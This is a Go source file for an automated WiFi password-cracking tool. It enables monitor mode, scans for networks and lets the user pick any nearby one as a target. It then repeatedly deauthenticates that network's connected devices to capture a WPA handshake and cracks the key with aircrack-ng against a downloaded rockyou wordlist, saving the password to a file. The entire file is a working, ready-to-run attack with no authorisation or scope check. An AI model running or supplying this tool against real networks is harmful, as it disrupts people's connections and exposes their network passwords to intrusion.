package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/fatih/color"
)

// ==========================================
// Data Models
// ==========================================
type Network struct {
	BSSID   string
	CH      string
	ESSID   string
	Sec     string
	Clients []string
}

// ==========================================
// Global State & UI Colors
// ==========================================
var (
	cyan   = color.New(color.FgCyan, color.Bold)
	green  = color.New(color.FgGreen, color.Bold)
	yellow = color.New(color.FgYellow, color.Bold)
	red    = color.New(color.FgRed, color.Bold)
	white  = color.New(color.FgWhite, color.Bold)

	monIface   string
	activeCmds []*exec.Cmd
)

// ==========================================
// Main Entry Point
// ==========================================
func main() {
	setupSignalHandler()

	if os.Geteuid() != 0 {
		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
		os.Exit(1)
	}

	cyan.Println("=======================================")
	cyan.Println("    Automated WiFi Cracker CLI v9.0   ")
	cyan.Println("=======================================")

	setupEnvironment()

	iface := selectInterface()
	monIface = iface + "mon"

	yellow.Println("\n[*] Enabling Monitor Mode...")
	runCmdSilent("airmon-ng", "check", "kill")
	runCmdSilent("airmon-ng", "start", iface)
	green.Println("[+] Monitor Mode enabled successfully.")

	defer cleanup()

	networks := scanNetworks()
	target := selectTarget(networks)

	yellow.Printf("\n[*] Scanning '%s' for connected devices (10s)...\n", target.ESSID)
	target = findConnectedClients(target)

	if len(target.Clients) > 0 {
		printClientTable(target)
	} else {
		red.Println("[!] WARNING: No connected devices found. Will attempt broadcast deauth.")
	}

	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_")
	targetDir := filepath.Join("data", sanitizedEssid)

	yellow.Printf("\n[*] Creating directory for target: %s\n", targetDir)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
		os.Exit(1)
	}
	green.Println("[+] Directory ready.")

	capFile := filepath.Join(targetDir, "handshake")

	captureHandshake(target, capFile, targetDir)

	if !verifyHandshake(capFile) {
		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 5 minutes.")
		cleanup()
		os.Exit(1)
	}

	green.Println("\n[+] Valid Handshake Captured Successfully!")
	crackPassword(capFile, targetDir)
	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
}

// ==========================================
// Interface Selection
// ==========================================
func selectInterface() string {
	yellow.Println("\n[*] Detecting available wireless interfaces...")

	entries, err := os.ReadDir("/sys/class/net/")
	if err != nil {
		red.Printf("[-] Failed to read interfaces: %v\n", err)
		os.Exit(1)
	}

	var ifaces []string
	for _, e := range entries {
		if _, err := os.Stat("/sys/class/net/" + e.Name() + "/wireless"); err == nil {
			ifaces = append(ifaces, e.Name())
		}
	}

	if len(ifaces) == 0 {
		red.Println("[-] No wireless interfaces found. Exiting.")
		os.Exit(1)
	}

	fmt.Println()
	cyan.Println("=== Available Wireless Interfaces ===")
	for i, iface := range ifaces {
		fmt.Printf("[%d] %s\n", i+1, iface)
	}

	reader := bufio.NewReader(os.Stdin)
	for {
		white.Print("\n[*] Select an interface (enter number): ")
		input, err := reader.ReadString('\n')
		if err != nil {
			red.Printf("[-] Failed to read input: %v\n", err)
			os.Exit(1)
		}

		input = strings.TrimSpace(input)
		choice, err := strconv.Atoi(input)

		if err != nil || choice < 1 || choice > len(ifaces) {
			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
			continue
		}

		selected := ifaces[choice-1]
		green.Printf("[+] Interface Selected: %s\n", selected)
		return selected
	}
}

// ==========================================
// Core Attack Functions
// ==========================================

func findConnectedClients(target Network) Network {
	scanFile := "client_scan_temp"
	os.Remove(scanFile + "-01.csv")

	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, monIface, "-w", scanFile, "--output-format", "csv")
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Start()
	activeCmds = append(activeCmds, cmd)

	time.Sleep(10 * time.Second)

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}

	file, err := os.Open(scanFile + "-01.csv")
	if err != nil {
		return target
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	isStation := false

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "Station MAC") {
			isStation = true
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 6 {
			continue
		}

		if isStation {
			stationMac := strings.TrimSpace(parts[0])
			targetBSSID := strings.TrimSpace(parts[5])
			if targetBSSID == target.BSSID && stationMac != "" {
				target.Clients = append(target.Clients, stationMac)
			}
		}
	}
	os.Remove(scanFile + "-01.csv")
	return target
}

func printClientTable(target Network) {
	fmt.Println()
	cyan.Println("=====================================================")
	cyan.Printf("  Connected Devices for: %s\n", target.ESSID)
	cyan.Println("=====================================================")
	fmt.Printf("  %-5s | %-20s\n", "No.", "MAC Address")
	fmt.Println("-----------------------------------------------------")
	for i, mac := range target.Clients {
		fmt.Printf("  %-5d | %-20s\n", i+1, mac)
	}
	cyan.Println("=====================================================")
}

func captureHandshake(target Network, capFile string, targetDir string) {
	// CRITICAL FIX: Delete old capture files so airodump-ng always writes to -01.cap
	oldFiles, _ := filepath.Glob(filepath.Join(targetDir, "handshake-*"))
	for _, f := range oldFiles {
		os.Remove(f)
	}

	yellow.Println("\n[*] Starting Handshake Capture Process...")

	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start capture: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(3 * time.Second) // Lock channel

	timeout := 5 * time.Minute
	checkInterval := 15 * time.Second
	elapsedTime := 0 * time.Second

	yellow.Printf("\n[*] Starting 5-Minute Active Capture & Deauth Loop...\n")

	for elapsedTime < timeout {
		// Send deauth to all clients every 15 seconds
		cyan.Println("\n[*] Sending Deauth bursts to all connected devices...")
		for _, clientMac := range target.Clients {
			yellow.Printf("[-] Deauth -> %s\n", clientMac)
			deauthArgs := []string{"--deauth", "5", "-a", target.BSSID, "-c", clientMac, monIface}
			deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
			deauthCmd.Stdout = nil
			deauthCmd.Stderr = nil
			deauthCmd.Run()
		}

		// Also send broadcast to catch random MACs
		if len(target.Clients) == 0 || true {
			yellow.Println("[-] Deauth -> Broadcast (All Devices)")
			bArgs := []string{"--deauth", "5", "-a", target.BSSID, monIface}
			bCmd := exec.Command("aireplay-ng", bArgs...)
			bCmd.Stdout = nil
			bCmd.Stderr = nil
			bCmd.Run()
		}

		// Wait for devices to reconnect and handshake
		white.Print("[*] Listening for handshake")
		for i := 0; i < 3; i++ {
			time.Sleep(5 * time.Second)
			white.Print(".")
		}
		fmt.Println()
		elapsedTime += checkInterval

		if verifyHandshake(capFile) {
			green.Println("\n[+] Handshake detected! Stopping capture phase.")
			if cmd.Process != nil {
				cmd.Process.Kill()
				cmd.Wait()
			}
			return
		}
	}

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
}

func verifyHandshake(capFile string) bool {
	finalCapFile := capFile + "-01.cap"
	if _, err := os.Stat(finalCapFile); os.IsNotExist(err) {
		return false
	}

	cmd := exec.Command("aircrack-ng", finalCapFile)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	cmd.Run()

	return strings.Contains(buf.String(), "1 handshake")
}

func crackPassword(capFile string, targetDir string) {
	finalCapFile := capFile + "-01.cap"
	cores := runtime.NumCPU()

	cyan.Println("\n=======================================")
	cyan.Println("       Starting Password Cracking      ")
	cyan.Println("=======================================")
	yellow.Printf("[*] File: %s\n", finalCapFile)
	yellow.Printf("[*] Wordlist: rockyou_clean.txt\n")
	yellow.Printf("[*] CPU Threads: %d\n", cores)
	fmt.Println()

	cmd := exec.Command("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)

	var buf bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
	cmd.Run()

	outputStr := buf.String()
	if strings.Contains(outputStr, "KEY FOUND!") {
		startIndex := strings.Index(outputStr, "KEY FOUND! [")
		if startIndex != -1 {
			restStr := outputStr[startIndex+len("KEY FOUND! ["):]
			endIndex := strings.Index(restStr, "]")
			if endIndex != -1 {
				password := restStr[:endIndex]

				fmt.Println()
				green.Println("=======================================")
				green.Printf("🎯  PASSWORD FOUND: %s  🎯\n", password)
				green.Println("=======================================")

				passFilePath := filepath.Join(targetDir, "password.txt")
				err := os.WriteFile(passFilePath, []byte("WiFi: "+filepath.Base(targetDir)+"\nPassword: "+password+"\n"), 0644)
				if err == nil {
					cyan.Printf("[+] Password saved securely to: %s\n", passFilePath)
				}
				fmt.Println()
			}
		}
	} else {
		red.Println("\n[-] Password not found in the wordlist.")
	}
}

// ==========================================
// Scanning & Parsing
// ==========================================

func scanNetworks() []Network {
	yellow.Println("\n[*] Scanning networks for 15 seconds...")
	scanFile := "scan_temp"
	os.Remove(scanFile + "-01.csv")

	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start airodump-ng: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(15 * time.Second)

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
	green.Println("[+] Scan completed.")

	networks := parseCSV(scanFile + "-01.csv")
	if len(networks) == 0 {
		red.Println("[-] ERROR: No networks found.")
		cleanup()
		os.Exit(1)
	}

	fmt.Println()
	cyan.Println("=== Discovered WiFi Networks ===")
	for i, net := range networks {
		fmt.Printf("[%d] ESSID: %-20s | BSSID: %s | CH: %-2s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
	}

	return networks
}

func selectTarget(networks []Network) Network {
	reader := bufio.NewReader(os.Stdin)
	for {
		white.Print("\n[*] Enter the number of the target network: ")
		input, err := reader.ReadString('\n')
		if err != nil {
			red.Printf("[-] Failed to read input: %v\n", err)
			cleanup()
			os.Exit(1)
		}

		input = strings.TrimSpace(input)
		choice, err := strconv.Atoi(input)

		if err != nil || choice < 1 || choice > len(networks) {
			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
			continue
		}

		target := networks[choice-1]
		yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)
		return target
	}
}

func parseCSV(filename string) []Network {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)
	isStation := false

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "Station MAC") {
			isStation = true
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		if !isStation {
			bssid := strings.TrimSpace(parts[0])
			ch := strings.TrimSpace(parts[3])
			sec := strings.TrimSpace(parts[5])
			essid := strings.TrimSpace(parts[13])

			if bssid != "" && essid != "" && bssid != "BSSID" && essid != "ESSID" {
				networks = append(networks, Network{
					BSSID: bssid,
					CH:    ch,
					ESSID: essid,
					Sec:   sec,
				})
			}
		}
	}
	return networks
}

// ==========================================
// Environment Setup
// ==========================================

func setupEnvironment() {
	yellow.Println("\n[*] Checking environment dependencies...")

	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		red.Println("[-] aircrack-ng not found. Installing...")
		runCmd("apt", "update")
		runCmd("apt", "install", "aircrack-ng", "-y")
	} else {
		green.Println("[+] aircrack-ng is already installed.")
	}

	if _, err := exec.LookPath("wget"); err != nil {
		red.Println("[-] wget not found. Installing...")
		runCmd("apt", "install", "wget", "-y")
	}

	wordlistPath := "/usr/share/wordlists/rockyou.txt"
	if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
		red.Println("[-] rockyou.txt not found. Downloading (130MB)...")
		runCmd("mkdir", "-p", "/usr/share/wordlists")
		runCmd("wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-O", wordlistPath)
		green.Println("[+] rockyou.txt downloaded successfully.")
	} else {
		green.Println("[+] rockyou.txt is already downloaded.")
	}

	cleanWordlistPath := "/usr/share/wordlists/rockyou_clean.txt"
	if _, err := os.Stat(cleanWordlistPath); os.IsNotExist(err) {
		yellow.Println("[*] Optimizing Wordlist: Removing passwords shorter than 8 characters...")
		cleanFile, err := os.Create(cleanWordlistPath)
		if err != nil {
			red.Printf("[-] Failed to create clean wordlist: %v\n", err)
			return
		}
		defer cleanFile.Close()

		awkCmd := exec.Command("awk", "length>=8", wordlistPath)
		awkCmd.Stdout = cleanFile
		awkCmd.Stderr = os.Stderr
		if err := awkCmd.Run(); err != nil {
			red.Printf("[-] Wordlist optimization failed: %v\n", err)
		} else {
			green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
		}
	} else {
		green.Println("[+] Optimized wordlist 'rockyou_clean.txt' is ready.")
	}
}

// ==========================================
// System & Cleanup Utilities
// ==========================================

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println()
		red.Println("\n[!] Interrupted by user. Cleaning up...")
		cleanup()
		os.Exit(1)
	}()
}

func cleanup() {
	yellow.Println("\n[*] Performing cleanup operations...")

	for _, cmd := range activeCmds {
		if cmd != nil && cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}
	activeCmds = nil

	if monIface != "" {
		yellow.Printf("[*] Disabling monitor mode on %s...\n", monIface)
		runCmdSilent("airmon-ng", "stop", monIface)
	}

	yellow.Println("[*] Restarting NetworkManager...")
	runCmdSilent("systemctl", "start", "NetworkManager")

	os.Remove("scan_temp-01.csv")
	os.Remove("client_scan_temp-01.csv")

	green.Println("[+] Cleanup complete.")
}

func runCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}

func runCmdSilent(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Run()
}
